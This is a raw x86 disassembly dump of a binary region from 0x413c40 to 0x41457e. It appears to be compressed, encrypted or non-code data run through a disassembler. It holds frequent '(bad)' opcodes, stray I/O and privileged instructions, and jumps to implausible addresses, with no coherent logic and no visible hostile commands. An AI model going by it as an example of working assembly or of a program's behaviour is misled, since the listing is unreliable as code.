  413c40:	or     eax,0xfcedd4e8
  413c45:	jbe    0x413bcc
  413c47:	cld    
  413c48:	mov    ebx,0x7fa327ff
  413c4d:	xor    edx,ecx
  413c4f:	sub    DWORD PTR [edi],ecx
  413c51:	sbb    esp,DWORD PTR [ecx+ebp*8]
  413c54:	jp     0x413c99
  413c56:	aam    0x9c
  413c58:	test   DWORD PTR [ebx-0xc],eax
  413c5b:	push   esp
  413c5c:	sbb    BYTE PTR [edi],al
  413c5e:	arpl   ax,bp
  413c60:	aad    0xab
  413c62:	jno    0x413c44
  413c64:	in     eax,dx
  413c65:	(bad)
  413c69:	sbb    esi,ebp
  413c6b:	mov    ecx,DWORD PTR [eax+0x1b]
  413c6e:	jmp    0x9f503f17
  413c73:	and    cl,BYTE PTR [ecx]
  413c75:	dec    ebp
  413c76:	test   al,0xa4
  413c78:	jge    0x413cad
  413c7a:	icebp  
  413c7b:	and    DWORD PTR [esi],ecx
  413c7d:	aaa    
  413c7e:	int3   
  413c7f:	xchg   edx,eax
  413c80:	jp     0x413cc5
  413c82:	cld    
  413c83:	int3   
  413c84:	add    DWORD PTR [ebx-0x24],0xfffffff4
  413c88:	sbb    BYTE PTR [edi],al
  413c8a:	arpl   WORD PTR [eax],ax
	...
  413ca0:	pusha  
  413ca1:	xlat   BYTE PTR ds:[ebx]
  413ca2:	stos   DWORD PTR es:[edi],eax
  413ca3:	popa   
  413ca4:	push   0x21aa8fef
  413ca9:	or     DWORD PTR [edi],esi
  413cab:	popf   
  413cac:	xchg   ebx,eax
  413cad:	rcr    dl,cl
  413caf:	out    0xfe,al
  413cb1:	or     BYTE PTR [ebx],0x9e
  413cb4:	imul   ecx,DWORD PTR [esi+edi*2],0xffffff85
  413cb8:	lahf   
  413cb9:	jb     0x413cba
  413cbb:	je     0x413c63
  413cbd:	ja     0x413cc2
  413cbf:	push   esp
  413cc0:	add    BYTE PTR [esi-0x7fcc16c0],bh
  413cc6:	mov    ecx,?
  413cc8:	xchg   edi,eax
  413cc9:	or     al,0xfe
  413ccb:	out    dx,al
  413ccc:	jle    0x413c4e
  413cce:	and    esp,DWORD PTR [esi]
  413cd0:	in     al,0xb
  413cd2:	jle    0x413d21
  413cd4:	test   al,0x72
  413cd6:	(bad)  
  413cd7:	dec    edx
  413cd9:	add    BYTE PTR [ebx+0x4c5a6304],cl
  413cdf:	inc    ecx
  413ce0:	push   cs
  413ce1:	or     DWORD PTR [edx-0x20d3143],eax
  413ce7:	(bad)  
  413ce8:	mov    ebp,0xc218f985
  413ced:	les    eax,FWORD PTR [eax-0x7d]
  413cf0:	xor    al,0x17
  413cf2:	or     eax,0xfdf2f48c
  413cf7:	call   DWORD PTR [ebx-0x7d]
  413cfa:	push   cs
  413cfb:	inc    DWORD PTR [ecx-0xf]
  413cfe:	dec    esi
  413cff:	call   0x413ccb
	...
  413d18:	add    BYTE PTR [ecx+0x52895950],ah
  413d1e:	pop    ebx
  413d1f:	ror    BYTE PTR [eax],0x8e
  413d22:	push   esp
  413d23:	xchg   ebp,esp
  413d25:	pavgw  mm7,QWORD PTR [esi+0x0]
  413d29:	jle    0x413d2a
  413d2b:	push   edx
  413d2c:	push   esi
  413d2d:	sub    DWORD PTR [esi+0x54130843],ecx
  413d33:	jle    0x413cee
  413d35:	pop    esi
  413d36:	(bad)  
  413d37:	(bad)  
  413d38:	inc    DWORD PTR [edi]
  413d3a:	mov    BYTE PTR [ecx+0x318e7ac0],0x81
  413d41:	test   al,0x6
  413d43:	add    ah,bh
  413d45:	dec    esi
  413d46:	shl    ah,0x6
  413d49:	lds    edi,FWORD PTR ds:0x17ee77f
  413d4f:	add    BYTE PTR [eax],al
  413d51:	(bad)  
  413d52:	(bad)  [eax]
  413d54:	or     DWORD PTR [eax],esi
  413d56:	mov    ?,WORD PTR [esi]
  413d58:	sub    DWORD PTR [ecx+0x3efc0006],0x170aedc0
  413d62:	icebp  
  413d63:	xchg   DWORD PTR [edx],esi
  413d65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d66:	mov    ds:0x24e58238,al
  413d6b:	jnp    0x413da4
  413d6d:	es cmp al,0x42
  413d70:	push   cs
  413d71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d72:	sbb    DWORD PTR [ecx-0x12],eax
  413d75:	mov    eax,ds:0xb188d020
  413d7a:	mov    al,ds:0x80d3
	...
  413d8f:	add    BYTE PTR [eax],al
  413d91:	add    BYTE PTR [ecx],al
  413d93:	sbb    DWORD PTR [edx],edx
  413d95:	add    ah,BYTE PTR [edi+0x2c0b285a]
  413d9b:	adc    BYTE PTR [ebx+0x235a90e2],al
  413da1:	setle  BYTE PTR [ebx+0x7b]
  413da5:	pop    ss
  413da6:	es js  0x413dab
  413da9:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413dab:	sbb    DWORD PTR [ecx-0x16],eax
  413dae:	stos   DWORD PTR es:[edi],eax
  413daf:	and    dh,BYTE PTR [eax]
  413db1:	mov    BYTE PTR [ebp-0x6e],dh
  413db4:	xor    eax,DWORD PTR [edx+0x2f7b2065]
  413dba:	and    al,0xba
  413dbc:	iret   
  413dbd:	or     dl,ah
  413dbf:	mov    ds:0xdc2448d3,al
  413dc4:	push   es
  413dc5:	test   DWORD PTR [esi+0x4f],ebp
  413dc8:	mov    BYTE PTR [edx+eiz*8-0x37184d65],cl
  413dcf:	sbb    eax,DWORD PTR [edx]
  413dd1:	add    al,cl
  413dd3:	inc    ecx
  413dd4:	stos   DWORD PTR es:[edi],eax
  413dd5:	mov    BYTE PTR [ebx+0x47],dl
  413dd8:	inc    esp
  413dd9:	add    esp,DWORD PTR [edi-0x54dc395c]
  413ddf:	mov    ch,0x4e
  413de1:	dec    ebx
  413de2:	out    0x1b,al
  413de4:	jnp    0x413def
  413de6:	cs adc al,0x83
  413de9:	shl    DWORD PTR [ebx+0x2603429c],0x16
  413df0:	int    0x4c
  413df2:	out    0x2,al
  413df4:	jmp    0x413e8a
	...
  413e09:	add    BYTE PTR [eax],al
  413e0b:	adc    al,BYTE PTR [ebp-0x1c]
  413e0e:	add    ebp,DWORD PTR [edi+edi*4]
  413e11:	or     al,0x8
  413e13:	dec    ebp
  413e14:	inc    edi
  413e15:	sbb    al,0xc5
  413e17:	or     BYTE PTR [ebp-0x10],bh
  413e1a:	jl     0x413dca
  413e1c:	test   DWORD PTR [eax-0x13badbf8],ebp
  413e22:	test   dh,ch
  413e24:	(bad)  
  413e25:	sbb    eax,ebp
  413e27:	call   0xa483d4bf
  413e2c:	add    dh,BYTE PTR [edi*2-0x4cc74d3d]
  413e33:	sbb    eax,0x6b7ae0c0
  413e38:	div    BYTE PTR [ebx-0x47]
  413e3b:	mov    eax,0x991c18b4
  413e40:	add    ch,cl
  413e42:	add    edi,DWORD PTR [edi]
  413e44:	inc    esi
  413e45:	sbb    al,0xc5
  413e47:	test   al,0x76
  413e49:	stos   DWORD PTR es:[edi],eax
  413e4a:	or     esi,eax
  413e4c:	sbb    ch,BYTE PTR [edi]
  413e4e:	add    al,0xa7
  413e50:	add    bh,BYTE PTR [edx-0x47f51480]
  413e56:	sbb    edi,eax
  413e58:	add    ch,cl
  413e5a:	add    ebx,esp
  413e5c:	jnp    0x413eaa
  413e5e:	mov    cl,0x66
  413e60:	cli    
  413e61:	call   0x4ff5c18
  413e66:	cld    
  413e67:	sbb    eax,0x2fffccae
  413e6c:	inc    ebx
  413e6d:	test   al,0xfe
	...
  413e83:	add    BYTE PTR [edx],dl
  413e85:	sti    
  413e86:	daa    
  413e87:	and    eax,0x7ce27bb8
  413e8c:	addr16 ret 0x55f5
  413e90:	scas   eax,DWORD PTR es:[edi]
  413e91:	inc    ebx
  413e92:	pop    es
  413e93:	hlt    
  413e94:	lods   eax,DWORD PTR ds:[esi]
  413e95:	cld    
  413e96:	call   FWORD PTR [edi+0x2d]
  413e99:	jp     0x413e5b
  413e9b:	test   eax,0xa8084f29
  413ea0:	retf   
  413ea1:	add    DWORD PTR [ebx],ecx
  413ea3:	repz fwait
  413ea5:	sti    
  413ea6:	mov    BYTE PTR [eax+0x60034325],bh
  413eac:	gs leave 
  413eae:	push   cs
  413eaf:	jg     0x413ebe
  413eb1:	cli    
  413eb2:	sbb    BYTE PTR [eax+0x63],dh
  413eb5:	leave  
  413eb6:	push   cs
  413eb7:	jg     0x413eac
  413eb9:	inc    ecx
  413eba:	loopne 0x413e8d
  413ebc:	imul   edi,ebx,0xffffff88
  413ebf:	test   al,0xe4
  413ec1:	div    DWORD PTR [ebp+0xf2263f0]
  413ec7:	loop   0x413e97
  413ec9:	jns    0x413ed4
  413ecb:	pusha  
  413ecc:	arpl   cx,cx
  413ece:	push   cs
  413ecf:	aas    
  413ed0:	ret    
  413ed1:	inc    ecx
  413ed2:	loopne 0x413ec5
  413ed4:	mov    ebp,0xa43f0efa
  413ed9:	sti    
  413eda:	shl    BYTE PTR [eax-0x52],0xab
  413ede:	shl    ecx,0xa4
  413ee1:	mov    bl,0x8a
  413ee3:	mov    ch,0x80
  413ee5:	add    BYTE PTR [ebx+0xa5],cl
	...
  413efb:	add    BYTE PTR [eax],al
  413efd:	mov    ah,bh
  413eff:	mov    ch,bl
  413f01:	jecxz  0x413f22
  413f03:	pop    ss
  413f04:	jno    0x413eb1
  413f06:	ror    DWORD PTR [edx+0xf1fe3eb],0x61
  413f0d:	stos   DWORD PTR es:[edi],eax
  413f0e:	ror    DWORD PTR [edx+0x71fe3eb],0x71
  413f15:	stos   DWORD PTR es:[edi],eax
  413f16:	ror    DWORD PTR [eax-0x30849cce],0x6a
  413f1d:	out    0x3,al
  413f1f:	mov    ebp,ecx
  413f21:	int3   
  413f22:	add    al,0x8b
  413f24:	add    BYTE PTR [edi+edi*4-0x1a],cl
  413f28:	sbb    BYTE PTR [esi+0x3c8b40fe],dh
  413f2e:	mov    edi,0xfec610e6
  413f33:	inc    eax
  413f34:	mov    ecx,DWORD PTR [eax*8+0x39608e6]
  413f3b:	inc    ecx
  413f3c:	mov    ecx,DWORD PTR [esp+ecx*4]
  413f3f:	into   
  413f40:	mov    bh,bh
  413f42:	pop    edx
  413f43:	ror    BYTE PTR [eax],0xe
  413f46:	push   ecx
  413f47:	xchg   ebp,esp
  413f49:	(bad)  
  413f4a:	loop   0x413f56
  413f4c:	push   ebx
  413f4d:	nop
  413f4e:	dec    ebp
  413f4f:	mov    DWORD PTR [ebp-0x36],eax
  413f52:	mov    dl,BYTE PTR [ebx+0x8]
  413f55:	push   ebp
  413f56:	adc    al,0x89
  413f58:	dec    ebp
  413f59:	(bad)  
  413f5a:	mov    al,BYTE PTR [edi+0x4]
  413f5d:	inc    edi
  413f5e:	sar    DWORD PTR [edi+0xeb],1
	...
  413f74:	add    BYTE PTR [eax],al
  413f76:	ret    0xc934
  413f79:	sub    DWORD PTR ds:0xc90f0d06,0x1889d734
  413f83:	(bad)  
  413f84:	in     al,0x4
  413f86:	out    dx,eax
  413f87:	icebp  
  413f88:	xchg   esi,edx
  413f8a:	iret   
  413f8b:	call   0x8c09709e
  413f90:	icebp  
  413f91:	sbb    ebp,0x7e00fdf5
  413f97:	xor    al,0xd7
  413f99:	mov    eax,ecx
  413f9b:	ret    
  413f9c:	in     al,0x10
  413f9e:	jg     0x413f91
  413fa0:	xchg   esi,ecx
  413fa2:	mov    edi,0x903100e8
  413fa7:	mov    esi,ecx
  413fa9:	sub    DWORD PTR [ebp+0x7d333131],0xa789d834
  413fb3:	iret   
  413fb4:	inc    edx
  413fb5:	in     eax,0xa5
  413fb7:	sub    dl,BYTE PTR [ecx]
  413fb9:	mov    BYTE PTR [ecx-0x26],dh
  413fbc:	sbb    eax,0x7aef7607
  413fc1:	repnz es cld 
  413fc4:	or     al,0xff
  413fc6:	sub    DWORD PTR [ecx],ebx
  413fc8:	rcr    ecx,1
  413fca:	cs aas 
  413fcc:	inc    ecx
  413fcd:	in     eax,0xaf
  413fcf:	jmp    0xf601:0x2d9a883d
  413fd6:	sbb    al,0xb6
  413fd8:	xadd   BYTE PTR [eax],al
	...
  413fef:	adc    BYTE PTR [eax],ah
  413ff1:	jg     0x413fd9
  413ff3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ff4:	xchg   edx,eax
  413ff5:	adc    DWORD PTR [eax],ecx
  413ff7:	out    dx,al
  413ff8:	mov    eax,ds:0xa1d93034
  413ffd:	jo     0xa999f2c7
  414003:	or     eax,0xee30282a
  414008:	popf   
  414009:	(bad)  
  41400a:	adc    DWORD PTR [esi],ebx
  41400c:	push   eax
  41400d:	inc    ecx
  41400e:	out    dx,al
  41400f:	mov    al,ds:0x2e00239c
  414014:	mov    edi,ecx
  414016:	stc    
  414017:	call   0xa7484bf1
  41401c:	sbb    DWORD PTR [edx],eax
  41401e:	mov    DWORD PTR [ecx-0x25],esi
  414021:	and    al,0x1b
  414023:	cs aad 0x41
  414026:	out    dx,al
  414027:	stos   DWORD PTR es:[edi],eax
  414028:	mov    ds:0xa38c080f,al
  41402d:	inc    esp
  41402e:	and    BYTE PTR [edi+0x18],0xcf
  414032:	sbb    eax,0xe57fe62e
  414037:	mov    al,0xa0
  414039:	(bad)  
  41403a:	mov    ah,0xab
  41403c:	outs   dx,BYTE PTR ds:[esi]
  41403d:	sar    edi,0x2f
  414040:	add    eax,DWORD PTR [esi+0x42]
  414043:	dec    ecx
  414044:	std    
  414045:	addr16 and al,0x4c
  414048:	add    ebp,ecx
  41404a:	add    ebx,DWORD PTR [ebp+ecx*2+0x2e7b0cc]
  414051:	jo     0x41407f
	...
  414067:	add    BYTE PTR [edi+0x16],ah
  41406a:	out    dx,al
  41406b:	or     BYTE PTR [ecx+0x7],0xe8
  41406f:	add    esp,DWORD PTR [edi+0x77cf35f9]
  414075:	ret    
  414076:	call   0xcd8539f7
  41407b:	repnz daa 
  41407d:	push   ds
  41407e:	aam    0x4
  414080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414081:	add    ah,dl
  414083:	push   edx
  414084:	mov    esp,0x2e0427b5
  414089:	nop
  41408a:	mov    ah,0x7d
  41408c:	jmp    0xf93a:0x1e00a881
  414093:	jmp    0x22aa65c7
  414098:	cdq    
  414099:	jns    0x41406f
  41409b:	push   eax
  41409c:	mov    WORD PTR [edi+eiz*1-0x6b7063fc],gs
  4140a3:	jge    0x414086
  4140a5:	inc    ebx
  4140a6:	xchg   ebp,eax
  4140a7:	add    ah,BYTE PTR [esi]
  4140a9:	push   ds
  4140aa:	jl     0x4140b0
  4140ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140ad:	add    ah,dl
  4140af:	push   edx
  4140b0:	ins    BYTE PTR es:[edi],dx
  4140b1:	scas   al,BYTE PTR es:[edi]
  4140b2:	daa    
  4140b3:	add    al,0x2e
  4140b5:	and    eax,0x83aa1b27
  4140ba:	inc    ebp
  4140bb:	or     BYTE PTR [eax+0x51fee805],dl
  4140c1:	(bad)  
  4140c2:	mov    edx,0x257a80c4
  4140c7:	inc    ebp
  4140c8:	mov    esp,ebp
  4140ca:	and    eax,DWORD PTR [bx+si]
	...
  4140e1:	ins    BYTE PTR es:[edi],dx
  4140e2:	add    al,BYTE PTR [eax]
  4140e4:	jmp    0xedf83a8d
  4140e9:	adc    al,0xc2
  4140eb:	call   edi
  4140ed:	mov    dl,0x7a
  4140ef:	aad    0x28
  4140f1:	test   ecx,ebp
  4140f3:	mov    BYTE PTR [esi],bh
  4140f5:	loop   0x41410b
  4140f7:	add    esp,DWORD PTR [eax-0x68]
  4140fa:	cli    
  4140fb:	cli    
  4140fc:	jo     0x4140e3
  4140fe:	cmp    BYTE PTR [edi-0x7718a61b],0x17
  414105:	and    BYTE PTR [edi],bl
  414107:	ds (bad) 
  414109:	test   DWORD PTR [ebp+0x3b],0x8704e23c
  414110:	mov    esi,0x6805146b
  414115:	lds    ecx,FWORD PTR [ecx]
  414117:	(bad)  
  414118:	call   0x5f83ac1
  41411d:	xor    dl,al
  41411f:	jmp    FWORD PTR [edi-0x43]
  414122:	inc    edx
  414123:	out    dx,al
  414124:	out    0x23,eax
  414126:	sbb    al,0xfb
  414128:	jmp    0x5e4c43d1
  41412d:	loopne 0x4140e0
  41412f:	inc    eax
  414130:	jmp    0x87016588
  414135:	(bad)  
  414136:	and    esi,0x2a48d
  41413c:	repnz push ebp
  41413e:	leave  
  41413f:	dec    esi
  414140:	sub    BYTE PTR [ebx+0x7d747b],ch
	...
  41415a:	sub    edi,DWORD PTR [edi]
  41415c:	sub    BYTE PTR [ecx+0x1ad27ba0],0x8d
  414163:	jnp    0x414142
  414165:	push   0xffffffc6
  414167:	les    ecx,FWORD PTR [edx+0x55c7f61d]
  41416d:	test   al,0xa4
  41416f:	div    DWORD PTR [eax+eax*1-0x46]
  414173:	xchg   ch,bl
  414175:	shl    ecx,0x1
  414178:	and    edi,0xffffffb2
  41417e:	inc    ebp
  41417f:	mov    cl,0x3a
  414181:	push   esp
  414182:	str    WORD PTR [ecx+0xce87fdf]
  414189:	sbb    DWORD PTR [ecx+0x4efffefb],0x1c3cb505
  414193:	aas    
  414194:	dec    BYTE PTR [eax+0x16edbe91]
  41419a:	mov    edi,0xe00fae0
  41419f:	add    BYTE PTR [ebx],cl
  4141a1:	mov    bh,0xc2
  4141a3:	dec    esi
  4141a4:	aas    
  4141a5:	add    BYTE PTR [edi-0x9b20211],ch
  4141ab:	jge    0x414228
  4141ad:	clc    
  4141ae:	push   cs
  4141af:	or     eax,DWORD PTR [ebx-0x2061f55]
  4141b5:	mov    DWORD PTR [esi],esi
  4141b7:	rcr    dh,0x1f
  4141ba:	xchg   eax,ecx
  4141bc:	iret   
  4141bd:	out    dx,al
	...
  4141d2:	add    BYTE PTR [edi-0x41],al
  4141d5:	pop    es
  4141d6:	icebp  
  4141d7:	push   edi
  4141d8:	into   
  4141d9:	das    
  4141da:	enter  0xbd57,0x7f
  4141de:	jecxz  0x414244
  4141e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141e1:	test   al,0xaa
  4141e3:	(bad)  
  4141e5:	das    
  4141e6:	fnstenv [edi]
  4141e8:	into   
  4141e9:	mov    edi,0xd488d1e0
  4141ee:	shl    DWORD PTR [eax],1
  4141f0:	mov    al,al
  4141f2:	or     DWORD PTR [eax+ecx*4],ebx
  4141f5:	into   
  4141f6:	shl    esi,0x6
  4141f9:	das    
  4141fa:	enter  0xbe17,0x7f
  4141fe:	jecxz  0x4141a7
  414200:	lods   al,BYTE PTR ds:[esi]
  414201:	add    edi,edi
  414203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414204:	jmp    0x723:0xda5f882a
  41420b:	mov    dh,0xd7
  41420d:	jp     0x4141de
  41420f:	rol    WORD PTR ds:0x44a26f31,0x80
  414217:	inc    esp
  414218:	sub    bl,dl
  41421a:	xor    dl,BYTE PTR [edx+ebp*1-0x259077d7]
  414221:	and    eax,DWORD PTR [ecx]
  414223:	jbe    0x4141fc
  414225:	jp     0x4141ee
  414227:	data16 icebp 
  414229:	repz xor BYTE PTR [edi-0x6e],dl
  41422d:	inc    esp
  41422e:	add    BYTE PTR [esp+ecx*1+0x7],0xff
  414233:	and    BYTE PTR [edx+0x2c],cl
  414236:	mov    BYTE PTR [eax],al
	...
  41424c:	call   FWORD PTR [ecx+0x22]
  41424f:	(bad)  
  414251:	pop    edx
  414252:	jns    0x41421b
  414254:	out    0x40,al
  414256:	(bad)  
  414257:	xor    bh,dl
  414259:	mov    eax,ds:0xc048043
  41425e:	test   DWORD PTR [esi],0x8a2c0aa0
  414264:	bound  esp,QWORD PTR [ecx]
  414266:	inc    ecx
  414267:	loop   0x414214
  414269:	or     bh,BYTE PTR [ebx]
  41426b:	mov    BYTE PTR [edi-0x54f84268],bh
  414271:	nop
  414272:	mov    ebp,0xa7091e07
  414277:	pop    ebp
  414278:	pop    esp
  414279:	mov    ds:0x10e55c16,al
  41427e:	add    dl,BYTE PTR [ebx+0x59]
  414281:	nop
  414282:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414283:	and    ebx,DWORD PTR [ebx-0x348c830d]
  414289:	fistp  DWORD PTR [edi-0x9fc6e7c]
  41428f:	outs   dx,DWORD PTR ds:[esi]
  414290:	ja     0x4142a4
  414292:	xchg   ebp,eax
  414293:	inc    edx
  414294:	cdq    
  414295:	mov    ecx,0x4633b327
  41429a:	fbstp  TBYTE PTR [ebx+0x8415880]
  4142a0:	jno    0x41430d
  4142a2:	sti    
  4142a3:	mov    dh,0xe7
  4142a5:	add    bh,BYTE PTR [edi]
  4142a7:	cld    
  4142a8:	pop    esp
  4142a9:	add    ch,BYTE PTR [edi]
  4142ab:	clc    
  4142ac:	adc    ecx,edi
  4142ae:	mov    ebp,0xb4
	...
  4142c3:	add    BYTE PTR [eax],al
  4142c5:	dec    eax
  4142c6:	inc    esp
  4142c7:	and    DWORD PTR [eax],ecx
  4142c9:	dec    ecx
  4142ca:	imul   edx,DWORD PTR [ebx-0x4a],0xffffffe7
  4142ce:	add    bh,bh
  4142d0:	(bad)  
  4142d2:	add    al,BYTE PTR [edi]
  4142d4:	test   eax,0x3efc4cd
  4142d9:	ror    BYTE PTR [ebx+0x5570b30c],cl
  4142df:	bound  edi,QWORD PTR [esi-0x7bb7260]
  4142e5:	and    ebx,DWORD PTR [eax-0x21]
  4142e8:	mov    dl,0x58
  4142ea:	jmp    0x4840:0x2010824
  4142f1:	ins    BYTE PTR es:[edi],dx
  4142f2:	inc    ebx
  4142f3:	out    0x78,eax
  4142f5:	imul   edi,edx,0x17
  4142f8:	sbb    al,0xf1
  4142fa:	(bad)  
  4142fb:	mov    dh,0x7
  4142fd:	dec    eax
  4142fe:	ds sbb al,0xc5
  414301:	fmul   DWORD PTR [esi-0x159ff3d4]
  414307:	nop
  414308:	or     cl,cl
  41430a:	add    DWORD PTR [eax],eax
  41430c:	dec    eax
  41430d:	jae    0x414352
  41430f:	out    0x78,eax
  414311:	arpl   dx,di
  414313:	pop    ss
  414314:	sbb    al,0xcd
  414316:	(bad)  
  414317:	jle    0x414320
  414319:	push   ebp
  41431a:	pop    DWORD PTR [eax]
  41431c:	sub    al,0xb3
  41431e:	push   ecx
  41431f:	call   0xfe41f28f
  414324:	ret    0xee13
  414327:	pop    ebx
  414328:	sub    eax,DWORD PTR [eax]
	...
  41433e:	mov    eax,DWORD PTR [ecx]
  414340:	push   ebp
  414341:	pusha  
  414342:	mov    BYTE PTR [esp+ebp*8-0x76a8ca07],0xa4
  41434a:	ins    BYTE PTR es:[edi],dx
  41434b:	mov    WORD PTR [ebx-0x13],?
  41434e:	out    dx,eax
  41434f:	inc    esi
  414350:	clc    
  414351:	cdq    
  414352:	adc    eax,0xa032fae9
  414357:	add    BYTE PTR [esp+ebp*4+0x2a8151b4],cl
  41435e:	dec    ebx
  41435f:	push   esp
  414360:	call   0xfe41ef69
  414365:	and    eax,0xafe93f4d
  41436b:	inc    esi
  41436c:	clc    
  41436d:	cdq    
  41436e:	mov    WORD PTR [eax+0x69a9f6fc],ds
  414374:	mov    esp,0x8d00e39d
  414379:	sub    al,0xbb
  41437b:	push   ecx
  41437c:	call   0xfe41e3f1
  414381:	bound  ecx,QWORD PTR [edi-0x3]
  414384:	mov    DWORD PTR [ebx+edx*4],esp
  414387:	mov    al,BYTE PTR [ebx-0x3b]
  41438a:	jae    0x4143ea
  41438c:	lock push ecx
  41438e:	fisttp WORD PTR [ebp+0x3f]
  414391:	jmp    0x1a3989f5
  414396:	mov    ebx,0xa9a6fc70
  41439b:	imul   edi,DWORD PTR [esp+ebp*1],0x2c8d00e2
	...
  4143b6:	add    BYTE PTR [ebx-0x50f717af],bl
  4143bc:	add    dh,bh
  4143be:	add    BYTE PTR ds:0x838bf9aa,dh
  4143c4:	push   ss
  4143c5:	mov    BYTE PTR [ebp+0x1a],al
  4143c8:	jg     0x414426
  4143ca:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143cc:	dec    edx
  4143cd:	dec    esp
  4143ce:	inc    ecx
  4143cf:	jle    0x41444c
  4143d1:	inc    esp
  4143d2:	clc    
  4143d3:	dec    esi
  4143d4:	sbb    al,0x46
  4143d6:	cld    
  4143d7:	(bad)  [eax]
  4143d9:	gs mov esp,0x8cfdc71b
  4143df:	inc    ebx
  4143e0:	adc    al,0x4d
  4143e2:	call   0x3f4e8e
  4143e7:	inc    eax
  4143e8:	jnp    0x41442e
  4143ea:	clc    
  4143eb:	ds sbb al,0xdd
  4143ee:	sti    
  4143ef:	mov    DWORD PTR [eax],ecx
  4143f1:	add    dh,0x56
  4143f4:	scas   al,BYTE PTR es:[edi]
  4143f5:	mov    WORD PTR [ebp-0x62],es
  4143f8:	mov    bl,0xe5
  4143fa:	rcl    DWORD PTR [ebp+0x55efe08],cl
  414400:	jg     0x4143eb
  414402:	pop    ebp
  414403:	jl     0x414400
  414405:	std    
  414406:	push   esp
  414407:	xchg   DWORD PTR [edx],esp
  414409:	sub    ah,0x7a
  41440c:	push   es
  41440d:	add    BYTE PTR [eax],al
  41440f:	int    0xb0
  414411:	push   esi
  414412:	mov    ecx,ebx
  414414:	dec    BYTE PTR [edx-0x7b86f58b]
  41441a:	add    BYTE PTR [eax],0x0
	...
  41442d:	add    BYTE PTR [eax],al
  41442f:	add    al,ch
  414431:	add    eax,0x47d650fe
  414436:	add    BYTE PTR [eax],al
  414438:	(bad)  
  414439:	cdq    
  41443a:	std    
  41443b:	fidiv  DWORD PTR [di+0x40]
  414440:	out    0x73,al
  414442:	sti    
  414443:	dec    DWORD PTR [ecx]
  414445:	aam    0xcf
  414447:	mov    bh,BYTE PTR [edx+ecx*8]
  41444a:	dec    ebx
  41444b:	inc    ecx
  41444c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41444d:	jmp    0x2bb647cb
  414452:	jg     0x41444d
  414454:	lahf   
  414455:	add    eax,0x222c611
  41445a:	push   es
  41445b:	(bad)  
  41445c:	mov    al,ds:0xa70001ea
  414461:	test   BYTE PTR [eax+0x7d729788],dh
  414467:	jae    0x4143f2
  414469:	pusha  
  41446a:	add    esi,DWORD PTR [eax]
  41446c:	push   ebp
  41446d:	inc    esp
  41446e:	aam    0x8a
  414470:	and    dl,ch
  414472:	add    edi,esi
  414474:	jo     0x4144e8
  414476:	jge    0x4144f3
  414478:	imul   eax,DWORD PTR [eax+0x3],0x3bd2afe
  41447f:	(bad)  
  414480:	pop    eax
  414481:	fs jne 0x4144ff
  414484:	push   ecx
  414485:	sub    BYTE PTR [ebx],al
  414487:	push   cs
  414488:	or     esp,ebp
  41448a:	sbb    bh,0xc0
  41448d:	fs inc ebp
  41448f:	jnp    0x4144ca
  414491:	adc    BYTE PTR [ebx],al
  414493:	push   cs
	...
  4144a8:	add    cl,bh
  4144aa:	(bad)  
  4144ab:	shl    bh,cl
  4144ad:	pop    ds
  4144ae:	jmp    0x82bf:0xaca7023b
  4144b5:	sbb    eax,0x270486e1
  4144ba:	and    al,0x4
  4144bc:	jne    0x41449f
  4144be:	ss scas al,BYTE PTR es:[edi]
  4144c0:	out    0x8c,eax
  4144c2:	xlat   BYTE PTR ds:[ebx]
  4144c3:	add    al,0xfe
  4144c5:	and    al,0x86
  4144c7:	mov    ebp,edi
  4144c9:	lock mov DWORD PTR [ecx],0x8ee9ac80
  4144d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144d1:	and    al,0x76
  4144d3:	mov    ebp,edi
  4144d5:	fsubr  DWORD PTR [edi+0x2317501]
  4144db:	je     0x41455b
  4144dd:	dec    eax
  4144de:	add    BYTE PTR [edi+0xeea7004],bl
  4144e4:	add    esp,DWORD PTR [edi+0x4da62e02]
  4144ea:	mov    DWORD PTR [ebx-0x18f6195a],edx
  4144f0:	scas   al,BYTE PTR es:[edi]
  4144f1:	das    
  4144f2:	call   0x46d5c5f
  4144f7:	out    0x3,eax
  4144f9:	hlt    
  4144fa:	push   esp
  4144fb:	mov    esi,0x720aeb78
  414500:	mov    gs,WORD PTR [edi+ecx*4-0x1857c94]
  414507:	dec    esi
  414508:	mov    bl,0x88
  41450a:	(bad)  
  41450b:	out    0x3,eax
	...
  414521:	add    BYTE PTR [edi-0x63641898],ah
  414527:	dec    esp
  414528:	test   al,0x3
  41452a:	dec    edi
  41452b:	shr    BYTE PTR [esp+eax*1],cl
  41452e:	push   ecx
  41452f:	xor    al,0x39
  414531:	jns    0x414559
  414533:	aas    
  414534:	lods   eax,DWORD PTR ds:[esi]
  414535:	ret    0x8640
  414538:	jmp    0x41450b
  41453a:	out    0x81,al
  41453c:	adc    ebx,esi
  41453e:	lods   al,BYTE PTR ds:[esi]
  41453f:	repz cs jle 0x4144f3
  414543:	cld    
  414544:	inc    BYTE PTR [ebx]
  414546:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414547:	add    ah,bh
  414549:	add    ecx,DWORD PTR [edi+edx*2]
  41454c:	pusha  
  41454d:	adc    ebx,DWORD PTR [edi]
  41454f:	mov    BYTE PTR [ebx+0x2],bl
  414552:	or     esi,edi
  414554:	sbb    dh,dl
  414556:	push   cs
  414557:	xor    esp,DWORD PTR [edx-0x77]
  41455a:	jae    0x414558
  41455c:	into   
  41455d:	add    ebx,DWORD PTR [edi]
  41455f:	mov    BYTE PTR [ebx+0x2],al
  414562:	jmp    0x5bcb0464
  414567:	cld    
  414568:	add    BYTE PTR [esi+0x2d8b88a4],dh
  41456e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41456f:	cld    
  414570:	std    
  414571:	mul    dh
  414573:	add    eax,DWORD PTR [ecx-0x4473db77]
  414579:	adc    eax,0xdefdfca5
  41457e:	out    dx,al
